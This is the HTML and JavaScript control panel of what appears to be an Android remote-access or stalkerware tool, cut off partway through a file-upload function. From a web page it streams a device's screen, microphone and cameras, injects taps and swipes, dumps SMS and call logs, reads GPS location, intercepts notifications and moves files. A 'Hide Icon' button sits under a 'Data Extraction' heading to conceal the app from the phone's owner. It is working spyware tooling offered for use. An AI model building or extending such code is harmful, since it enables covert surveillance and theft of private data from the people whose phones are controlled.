<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Console</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<style>
  :root { --bg:#121212; --panel:#1E1E1E; --fg:#e0e0e0; --acc:#00E676; --warn:#FF5252; --dim:#888; --line:#333; }
  * { box-sizing: border-box; }
  body { margin:0; background:var(--bg); color:var(--fg); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; font-size:14px; padding-bottom:20px; }
  
  header { background:var(--panel); padding:12px; position:sticky; top:0; z-index:10; display:flex; flex-direction:column; gap:8px; border-bottom-left-radius: 16px; border-bottom-right-radius: 16px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
  .row { display:flex; align-items:center; gap:8px; }
  .input-group { flex:1; display:flex; gap:8px; min-width:0; }
  .input-group input { flex:1; min-width:0; background:#121212; border:1px solid var(--line); color:var(--fg); padding:10px; border-radius:8px; font-size:13px; outline:none; }
  #connectBtn { background:var(--acc); color:#000; border:none; padding:10px 16px; border-radius:8px; font-weight:bold; font-size:13px; cursor:pointer; white-space:nowrap; }
  .status-bar { display:flex; align-items:center; gap:6px; font-size:12px; font-weight:bold; color:var(--dim); }
  .dot { width:10px; height:10px; border-radius:50%; background:var(--warn); }
  .dot.on { background:var(--acc); box-shadow:0 0 8px var(--acc); }
  select { background:#121212; color:var(--acc); border:1px solid var(--line); padding:8px; border-radius:8px; outline:none; font-size:12px; max-width:160px; font-weight:bold; }

  #msg-box { display:none; background:var(--warn); color:#fff; padding:10px; text-align:center; font-weight:bold; font-size:12px; position:fixed; top:10px; left:10px; right:10px; z-index:99; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,0.5); }

  nav { display:flex; background:var(--bg); padding: 12px 12px 0 12px; gap: 8px; overflow-x:auto; scrollbar-width:none; }
  nav::-webkit-scrollbar { display:none; }
  nav button { flex:0 0 auto; background:var(--panel); border:none; color:var(--dim); padding:10px 16px; font-size:12px; font-weight:bold; text-transform:uppercase; border-radius:10px; white-space:nowrap; cursor:pointer; transition:0.2s; }
  nav button.active { color:#000; background:var(--acc); }

  main { padding:12px; }
  .tab { display:none; }
  .tab.active { display:block; animation: fadeIn 0.2s; }
  @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }

  .card { background:var(--panel); border-radius:16px; padding:16px; margin-bottom:12px; }
  .card h2 { margin:0 0 12px 0; font-size:13px; color:var(--acc); font-weight:bold; letter-spacing:0.5px; }
  .grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; }
  button.act { background:#2C2C2C; color:var(--fg); border:none; padding:14px; border-radius:12px; font-size:13px; font-weight:bold; text-align:center; cursor:pointer; transition:0.1s; }
  button.act:active { background:#444; transform:scale(0.96); }
  button.act.danger { color:#fff; background:var(--warn); }
  button.act.success { color:#000; background:var(--acc); }

  .screen-container { position:relative; width:100%; background:#000; border-radius:12px; margin-top:12px; overflow:hidden; touch-action:none; }
  canvas { width:100%; display:block; }
  .touch-ripple { position:absolute; width:30px; height:30px; border:2px solid var(--acc); border-radius:50%; transform:translate(-50%, -50%); pointer-events:none; animation:ripple 0.4s ease-out; }
  @keyframes ripple { from { opacity:1; transform:translate(-50%,-50%) scale(1); } to { opacity:0; transform:translate(-50%,-50%) scale(2); } }

  .kv { display:flex; justify-content:space-between; padding:10px 0; border-bottom:1px solid var(--line); font-size:13px; }
  .kv span { color:var(--dim); }
  pre { background:#121212; padding:12px; border-radius:12px; overflow:auto; font-size:12px; color:#aaa; max-height:250px; margin-top:12px; }

  .file-list { display:flex; flex-direction:column; gap:8px; margin-top:12px; }
  .file-item { display:flex; justify-content:space-between; padding:14px; background:#2C2C2C; border-radius:12px; font-size:13px; cursor:pointer; }
  .file-item.folder { color:#64B5F6; font-weight:bold; }
  .file-item:active { background:#444; transform:scale(0.98); }
  .path-bar { display:flex; gap:8px; }
  .path-bar input { flex:1; background:#121212; border:1px solid var(--line); color:var(--fg); padding:12px; border-radius:8px; outline:none; min-width:0; }
  
  #notif-log { display:flex; flex-direction:column; gap:8px; }
  .notif { background:#2C2C2C; padding:14px; border-radius:12px; font-size:13px; border-left:4px solid var(--acc); }
  .notif b { color:var(--acc); font-size:11px; display:block; margin-bottom:4px; text-transform:uppercase; }
  img#cam-img { width:100%; border-radius:12px; margin-top:12px; display:none; }
</style>
</head>
<body>

<div id="msg-box"></div>

<header>
  <div class="row">
    <div class="input-group">
      <input id="server" placeholder="Server URL" value="https://dmanager.onrender.com">
      <input id="psk" type="password" placeholder="PSK">
    </div>
    <button id="connectBtn" onclick="connect()">Connect</button>
  </div>
  
  <div class="row" style="justify-content:space-between;">
    <div class="status-bar">
      <div id="led" class="dot"></div>
      <span id="status">Disconnected</span>
    </div>
    <select id="device-select" onchange="onDeviceChange()"><option value="">No Device</option></select>
  </div>
</header>

<nav>
  <button class="active" onclick="switchTab('live', this)">Live</button>
  <button onclick="switchTab('device', this)">Device</button>
  <button onclick="switchTab('camera', this)">Camera</button>
  <button onclick="switchTab('files', this)">Files</button>
  <button onclick="switchTab('notifs', this)">Notifs</button>
</nav>

<main>
  <div id="tab-live" class="tab active">
    <div class="card">
      <h2>Live Screen</h2>
      <div class="grid" style="margin-bottom:10px;">
        <button class="act success" id="btn-screen" onclick="toggleScreen()">Start Screen</button>
        <button class="act" id="btn-audio" onclick="toggleAudio()">Start Audio</button>
      </div>
      <div class="screen-container" id="screen-container">
        <canvas id="screen" width="1080" height="1920"></canvas>
      </div>
      <div style="font-size:11px;color:var(--dim);margin-top:8px; text-align:center;" id="frameCount">0 frames</div>
    </div>
  </div>

  <div id="tab-device" class="tab">
    <div class="card">
      <h2>Device Info</h2>
      <div id="telemetry-data"><div class="kv"><span>Status</span><b>Select a device</b></div></div>
      <button class="act success" id="btn-refresh-telemetry" style="width:100%; margin-top:16px;" onclick="refreshTelemetry()">Refresh Info</button>
    </div>
    <div class="card">
      <h2>Data Extraction</h2>
      <div class="grid">
        <button class="act" onclick="runCmd('get_sms', {limit: 50})">Dump SMS</button>
        <button class="act" onclick="runCmd('get_calllogs', {limit: 50})">Dump Calls</button>
        <button class="act" onclick="runCmd('get_location')">GPS Location</button>
        <button class="act danger" onclick="runCmd('hide_icon')">Hide Icon</button>
      </div>
      <pre id="extract-out">Awaiting command...</pre>
    </div>
  </div>

  <div id="tab-camera" class="tab">
    <div class="card">
      <h2>Camera Control</h2>
      <div class="grid" style="margin-bottom:10px;">
        <button class="act success" onclick="runCmd('start_camera', {facing: 'front'})">Front Cam</button>
        <button class="act success" onclick="runCmd('start_camera', {facing: 'back'})">Back Cam</button>
      </div>
      <button class="act danger" style="width:100%;" onclick="stopCam()">Stop Camera</button>
      <img id="cam-img">
    </div>
  </div>

  <div id="tab-files" class="tab">
    <div class="card">
      <h2>File Manager</h2>
      <div class="path-bar">
        <input id="file-path" value="/sdcard" placeholder="/sdcard">
        <button class="act" id="btn-ls" style="padding:12px;" onclick="listDir()">Go</button>
      </div>
      <div class="file-list" id="file-list"></div>
      <pre id="files-out" style="margin-top:16px;">Awaiting command...</pre>
    </div>
    <div class="card">
      <h2>Transfer</h2>
      <input id="upload" type="file" style="color:var(--fg); margin-bottom:16px; display:block; width:100%;">
      <div class="grid">
        <button class="act success" id="btn-ul" onclick="uploadFile()">Upload File</button>
        <button class="act" id="btn-dl" onclick="downloadFile()">Download File</button>
      </div>
    </div>
  </div>

  <div id="tab-notifs" class="tab">
    <div class="card">
      <h2>Live Notifications</h2>
      <div id="notif-log"></div>
    </div>
  </div>
</main>

<script>
window.onerror = function(msg) {
  const box = document.getElementById('msg-box');
  box.textContent = "Error: " + msg;
  box.style.display = 'block';
  setTimeout(() => { box.style.display = 'none'; }, 5000);
};

const $ = id => document.getElementById(id);
let ws = null;
let currentDevice = "";
let realScreenW = 1080, realScreenH = 1920;

function switchTab(tabId, btn) {
  document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
  document.querySelectorAll('nav button').forEach(el => el.classList.remove('active'));
  $(`tab-${tabId}`).classList.add('active');
  if(btn) btn.classList.add('active');
}

function formatUrl(url) {
  if (!url) return "";
  url = url.trim().replace(/\/+$/, '');
  if (!url.startsWith('http://') && !url.startsWith('https://')) { url = 'https://' + url; }
  return url;
}

function onDeviceChange() {
  currentDevice = $('device-select').value;
  if (currentDevice) refreshTelemetry();
}

async function connect() {
  const psk = $('psk').value.trim();
  const server = formatUrl($('server').value);
  if (!psk || !server) { alert('Enter server + PSK'); return; }
  
  sessionStorage.setItem('psk', psk);
  sessionStorage.setItem('server', server);
  
  $('connectBtn').textContent = 'Waking...';
  $('status').textContent = 'Waking...';
  
  // Wake Render server
  try { await fetch(server + '/api/wake', { mode: 'no-cors' }); } catch (e) {}
  
  openWs(server, psk);
}

function openWs(server, psk) {
  if (ws) try { ws.close(); } catch (_) {}
  try {
    const u = new URL(server);
    u.protocol = u.protocol === 'https:' ? 'wss:' : 'ws:';
    u.pathname = '/ws'; u.search = '';
    
    ws = new WebSocket(u.toString());
    ws.onopen = () => { 
      $('led').className = 'dot on'; 
      $('status').textContent = 'Connected'; 
      $('connectBtn').textContent = 'Connected';
      ws.send(JSON.stringify({ role: 'dashboard', psk })); 
    };
    ws.onmessage = ev => { try { handlePush(JSON.parse(ev.data)); } catch (_) {} };
    ws.onclose = () => {
      $('led').className = 'dot'; 
      $('status').textContent = 'Reconnecting...';
      $('connectBtn').textContent = 'Reconnect';
      const p = sessionStorage.getItem('psk'), s = sessionStorage.getItem('server');
      if (p && s) setTimeout(() => openWs(s, p), 3000);
    };
    ws.onerror = () => { 
      $('status').textContent = 'WS Error'; 
      $('connectBtn').textContent = 'Connect';
    };
  } catch(e) { $('status').textContent = 'Invalid URL'; }
}

function handlePush(msg) {
  if (msg.type === 'device_list') {
    const sel = $('device-select');
    sel.innerHTML = '<option value="">Select Device</option>';
    msg.devices.forEach(addDeviceOption);
    if (msg.devices.length > 0 && !currentDevice) { sel.value = msg.devices[0]; onDeviceChange(); }
  } else if (msg.type === 'device_online') {
    addDeviceOption(msg.device_id);
  } else if (msg.type === 'device_offline') {
    const sel = $('device-select');
    const opt = [...sel.options].find(o => o.value === msg.device_id);
    if (opt) opt.remove();
    if (currentDevice === msg.device_id) { currentDevice = ""; }
  } else if (msg.type === 'push') {
    if (msg.kind === 'screen_frame') drawScreenFrame(msg.data);
    else if (msg.kind === 'camera_frame') { $('cam-img').src = 'data:image/jpeg;base64,' + msg.data; $('cam-img').style.display = 'block'; }
    else if (msg.kind === 'audio_chunk') playAudio(msg.data);
    else if (msg.kind === 'notification') addNotif(msg.data);
  } else if (msg.type === 'error') {
    $('status').textContent = msg.error;
    alert('Server auth failed. Check PSK.');
  }
}

function addDeviceOption(id) {
  const sel = $('device-select');
  if ([...sel.options].some(o => o.value === id)) return;
  const opt = document.createElement('option');
  opt.value = id; opt.textContent = id;
  sel.appendChild(opt);
  if (!currentDevice) { sel.value = id; onDeviceChange(); }
}

let frameCount = 0;
function drawScreenFrame(b64) {
  const cv = $('screen'), ctx = cv.getContext('2d');
  const img = new Image();
  img.onload = () => {
    if (cv.width !== img.width || cv.height !== img.height) { cv.width = img.width; cv.height = img.height; }
    ctx.drawImage(img, 0, 0);
    frameCount++; $('frameCount').textContent = frameCount + ' frames';
  };
  img.src = 'data:image/jpeg;base64,' + b64;
}

// Touch Logic
const cv = $('screen');
let touchStartX = 0, touchStartY = 0, touchStartTime = 0;
function getCanvasCoords(e) {
  const rect = cv.getBoundingClientRect();
  const clientX = e.touches ? e.touches[0].clientX : e.clientX;
  const clientY = e.touches ? e.touches[0].clientY : e.clientY;
  return { x: (clientX - rect.left) * (cv.width / rect.width), y: (clientY - rect.top) * (cv.height / rect.height) };
}
function showRipple(clientX, clientY) {
  const cont = $('screen-container');
  const rect = cont.getBoundingClientRect();
  const rip = document.createElement('div');
  rip.className = 'touch-ripple';
  rip.style.left = (clientX - rect.left) + 'px';
  rip.style.top = (clientY - rect.top) + 'px';
  cont.appendChild(rip);
  setTimeout(() => rip.remove(), 400);
}
cv.addEventListener('touchstart', e => { e.preventDefault(); const c = getCanvasCoords(e); touchStartX = c.x; touchStartY = c.y; touchStartTime = Date.now(); showRipple(e.touches[0].clientX, e.touches[0].clientY); }, { passive: false });
cv.addEventListener('touchend', async e => {
  e.preventDefault(); const c = getCanvasCoords(e.changedTouches[0]); const dx = Math.abs(c.x - touchStartX), dy = Math.abs(c.y - touchStartY), duration = Date.now() - touchStartTime;
  const rsX = touchStartX * (realScreenW / cv.width), rsY = touchStartY * (realScreenH / cv.height);
  const reX = c.x * (realScreenW / cv.width), reY = c.y * (realScreenH / cv.height);
  if (dx < 20 && dy < 20 && duration < 300) { try { await api('tap', { x: rsX, y: rsY }); } catch (_) {} }
  else { try { await api('swipe', { x1: rsX, y1: rsY, x2: reX, y2: reY, duration: Math.max(duration, 200) }); } catch (_) {} }
}, { passive: false });

let actx = null, atime = 0;
function playAudio(b64) {
  if (!actx) { actx = new AudioContext({ sampleRate: 16000 }); atime = actx.currentTime; }
  if (actx.state === 'suspended') actx.resume();
  const bin = atob(b64);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  const pcm = new Int16Array(bytes.buffer);
  const buf = actx.createBuffer(1, pcm.length, 16000);
  const ch = buf.getChannelData(0);
  for (let i = 0; i < pcm.length; i++) ch[i] = pcm[i] / 32768;
  const src = actx.createBufferSource(); src.buffer = buf; src.connect(actx.destination);
  if (atime < actx.currentTime) atime = actx.currentTime;
  src.start(atime); atime += buf.duration;
}

function addNotif(raw) {
  const log = $('notif-log');
  const div = document.createElement('div');
  div.className = 'notif';
  try { const o = JSON.parse(raw); div.innerHTML = `<b>${o.pkg}</b>${o.title ? '<strong>'+o.title+'</strong><br>' : ''}${o.text}`; }
  catch (_) { div.textContent = raw; }
  log.prepend(div);
}

function renderTelemetry(t) {
  const el = $('telemetry-data'); el.innerHTML = '';
  for (const [k, v] of Object.entries(t)) {
    if(k === 'screen_w') realScreenW = v;
    if(k === 'screen_h') realScreenH = v;
    const row = document.createElement('div'); row.className = 'kv';
    row.innerHTML = `<span>${k.replace(/_/g, ' ')}</span><b>${v}</b>`;
    el.appendChild(row);
  }
}

async function api(cmd, args = {}) {
  if (!currentDevice) throw new Error("No device selected");
  const psk = $('psk').value.trim();
  const server = formatUrl($('server').value);
  if (!psk || !server) throw new Error("No credentials");
  
  const r = await fetch(server + '/api/cmd', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + psk },
    body: JSON.stringify({ device_id: currentDevice, cmd, args }),
  });
  
  if (!r.ok) {
    let body = ''; try { body = (await r.json()).error || ''; } catch (_) {}
    throw new Error(`HTTP ${r.status} — ${body}`);
  }
  return await r.json();
}

async function refreshTelemetry() {
  try { const r = await api('get_device_info'); if (r.ok) renderTelemetry(r.data); } catch (e) { alert(e.message); }
}

async function runCmd(cmd, args = {}) {
  try { 
    const r = await api(cmd, args); 
    $('extract-out').textContent = r.ok ? JSON.stringify(r.data, null, 2) : ('Error: ' + r.error); 
  } catch (e) { alert(e.message); }
}

let screenOn = false, audioOn = false;
async function toggleScreen() {
  try {
    if (!screenOn) { const r = await api('start_screen'); if (r.ok) { screenOn = true; $('btn-screen').textContent = 'Stop Screen'; $('btn-screen').classList.remove('success'); $('btn-screen').classList.add('danger'); } else alert(r.error); }
    else { await api('stop_screen'); screenOn = false; $('btn-screen').textContent = 'Start Screen'; $('btn-screen').classList.add('success'); $('btn-screen').classList.remove('danger'); }
  } catch (e) { alert(e.message); }
}

async function toggleAudio() {
  try {
    if (!audioOn) { const r = await api('start_audio'); if (r.ok) { audioOn = true; $('btn-audio').textContent = 'Stop Audio'; $('btn-audio').classList.add('danger'); } else alert(r.error); }
    else { await api('stop_audio'); audioOn = false; $('btn-audio').textContent = 'Start Audio'; $('btn-audio').classList.remove('danger'); }
  } catch (e) { alert(e.message); }
}

async function stopCam() {
  try { await api('stop_camera'); $('cam-img').style.display = 'none'; } catch (e) { alert(e.message); }
}

async function listDir() {
  try { 
    const r = await api('list_dir', { path: $('file-path').value });
    const list = $('file-list'); list.innerHTML = '';
    if (r.ok) {
      r.data.entries.forEach(f => {
        const div = document.createElement('div');
        div.className = 'file-item ' + (f.dir ? 'folder' : '');
        div.innerHTML = `<span>${f.dir ? '📁' : '📄'} ${f.name}</span><span>${f.dir ? '' : (f.size/1024).toFixed(1)+' KB'}</span>`;
        div.onclick = () => { $('file-path').value = f.path; if (f.dir) { listDir(); } };
        list.appendChild(div);
      });
    } else alert('Error: ' + r.error);
  } catch (e) { alert(e.message); }
}

async function downloadFile() {
  try { 
    const r = await api('download_file', { path: $('file-path').value });
    if (r.ok) {
      const bytes = Uint8Array.from(atob(r.data.b64), c => c.charCodeAt(0));
      const blob = new Blob([bytes], { type: 'application/octet-stream' });
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = $('file-path').value.split('/').pop() || 'file.bin';
      a.click();
      $('files-out').textContent = 'Downloaded.';
    } else alert('Error: ' + r.error);
  } catch (e) { alert(e.message); }
}

async function uploadFile() {
  try {
    const inp = $('upload'); if (!inp.files.length) return;
    const f = inp.files[0];
    const reader = new FileReader();
    reader.onload = async () => {
      const b64 = reader.result.split(',')[1];
      $('fi
